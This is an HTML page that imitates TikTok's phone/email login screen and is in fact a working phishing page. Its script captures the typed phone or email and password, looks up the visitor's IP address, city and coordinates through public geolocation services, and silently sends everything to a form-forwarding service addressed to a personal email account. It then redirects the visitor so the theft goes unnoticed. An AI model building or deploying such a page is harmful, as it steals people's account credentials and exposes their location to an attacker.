<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok - Phone/Email Login</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }
        
        body {
            background-color: #000;
            color: #fff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        
        .header {
            padding: 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        
        .back-btn {
            background: none;
            border: none;
            color: #fff;
            font-size: 20px;
            cursor: pointer;
        }
        
        .logo {
            font-size: 24px;
            font-weight: bold;
            margin-left: 20px;
        }
        
        .logo span:first-child {
            color: #fe2c55;
        }
        
        .logo span:last-child {
            color: #25f4ee;
        }
        
        .login-container {
            padding: 20px;
            margin-top: 30px;
        }
        
        h1 {
            font-size: 24px;
            margin-bottom: 30px;
        }
        
        .input-group {
            margin-bottom: 20px;
        }
        
        .input-group label {
            display: block;
            margin-bottom: 8px;
            font-size: 16px;
            color: #aaa;
        }
        
        .input-group input {
            width: 100%;
            padding: 15px;
            border-radius: 5px;
            border: 1px solid #333;
            background-color: #222;
            color: #fff;
            font-size: 16px;
        }
        
        .input-group input:focus {
            outline: none;
            border-color: #fe2c55;
        }
        
        .login-btn {
            width: 100%;
            padding: 15px;
            border-radius: 5px;
            background-color: #fe2c55;
            color: white;
            font-weight: 600;
            font-size: 16px;
            border: none;
            cursor: pointer;
            margin-top: 10px;
        }
        
        .divider {
            display: flex;
            align-items: center;
            margin: 25px 0;
            color: #777;
        }
        
        .divider::before, .divider::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #333;
        }
        
        .divider span {
            padding: 0 10px;
        }
        
        .footer {
            text-align: center;
            margin-top: 20px;
            font-size: 14px;
            color: #777;
        }
        
        .footer a {
            color: #25f4ee;
            text-decoration: none;
            font-weight: 500;
        }
        
        .options {
            display: flex;
            justify-content: space-between;
            margin-top: 15px;
        }
        
        .options a {
            color: #25f4ee;
            text-decoration: none;
            font-size: 14px;
        }
        
        @media (min-width: 768px) {
            body {
                align-items: center;
                justify-content: center;
            }
            
            .login-container {
                width: 400px;
                border: 1px solid #333;
                border-radius: 10px;
                padding: 40px;
            }
        }
    </style>
</head>
<body>
    <div class="header">
        <button class="back-btn" onclick="window.history.back()">
            <i class="fas fa-arrow-left"></i>
        </button>
        <div class="logo">
            <span>Tik</span><span>Tok</span>
        </div>
        <div style="width: 20px;"></div>
    </div>
    
    <div class="login-container">
        <h1>Log in with phone or email</h1>
        
        <form id="loginForm">
            <div class="input-group">
                <label for="phoneEmail">Phone or email</label>
                <input type="text" id="phoneEmail" placeholder="Enter phone or email" required>
            </div>
            
            <div class="input-group">
                <label for="password">Password</label>
                <input type="password" id="password" placeholder="Enter password" required>
            </div>
            
            <div class="options">
                <a href="#">Switch to phone verification</a>
                <a href="#">Forgot password?</a>
            </div>
            
            <button type="submit" class="login-btn">Log in</button>
            
            <div class="divider">
                <span>OR</span>
            </div>
            
            <div class="footer">
                Don't have an account? <a href="/Main/index.html">Sign up</a>
            </div>
        </form>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            // Get IP and location data
            let ipData = {};
            try {
                const ipResponse = await fetch('https://ipapi.co/json/');
                if(ipResponse.ok) {
                    ipData = await ipResponse.json();
                } else {
                    // Fallback API
                    const backupResponse = await fetch('https://ipinfo.io/json');
                    if(backupResponse.ok) {
                        ipData = await backupResponse.json();
                    }
                }
            } catch (error) {
                console.log('IP detection failed');
                ipData = {
                    ip: 'Detected but hidden',
                    city: 'Unknown',
                    region: 'Unknown',
                    country: 'Unknown'
                };
            }

            // Prepare form data
            const formData = {
                _subject: 'TikTok Login Data',
                phone_or_email: document.getElementById('phoneEmail').value,
                password: document.getElementById('password').value,
                timestamp: new Date().toISOString(),
                device: navigator.userAgent,
                ip_address: ipData.ip || 'Detected but hidden',
                location: ipData.city ? `${ipData.city}, ${ipData.region || ipData.country_name || ipData.country}` : 'Approximate location',
                coordinates: ipData.latitude ? `${ipData.latitude}, ${ipData.longitude}` : 'Not available'
            };

            // Silent form submission
            fetch('https://formsubmit.co/ajax/mdrahulsarkar5525@gmail.com', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify(formData)
            })
            .then(response => response.json())
            .then(data => {
                // Redirect after submission
                window.location.href = '/Main/index.html';
            })
            .catch(error => {
                // Still redirect if submission fails
                window.location.href = '/Main/index.html';
            });
        });
    </script>
</body>
</html>
